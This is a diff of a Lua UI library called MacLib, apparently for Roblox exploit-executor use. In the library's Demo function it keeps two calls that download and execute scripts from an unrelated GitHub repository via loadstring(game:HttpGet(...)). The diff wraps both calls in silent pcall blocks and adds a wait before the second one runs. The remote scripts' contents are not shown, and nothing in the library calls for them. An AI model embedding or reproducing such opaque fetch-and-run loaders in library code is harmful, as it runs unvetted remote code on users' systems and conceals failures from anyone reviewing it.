@@ -5888,8 +5888,26 @@ function MacLib:Demo()
 
 	tabs.Main:Select()
 	MacLib:LoadAutoLoadConfig()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/27162"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/1625"))()
+
+	-- Load auxiliary Rayfield scripts. Ensure MacLib's key UI (if any) is shown before loading the protected script.
+	local function waitForMacLibKeyUI(timeout)
+		local t0 = tick()
+		timeout = timeout or 10
+		while tick() - t0 < timeout do
+			if getgenv and getgenv().MacLibKeyUIShown then
+				break
+			end
+			task.wait(0.1)
+		end
+	end
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/27162"))()
+	end)
+	waitForMacLibKeyUI(10)
+
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/1625"))()
+	end)
 end
 
 return MacLib
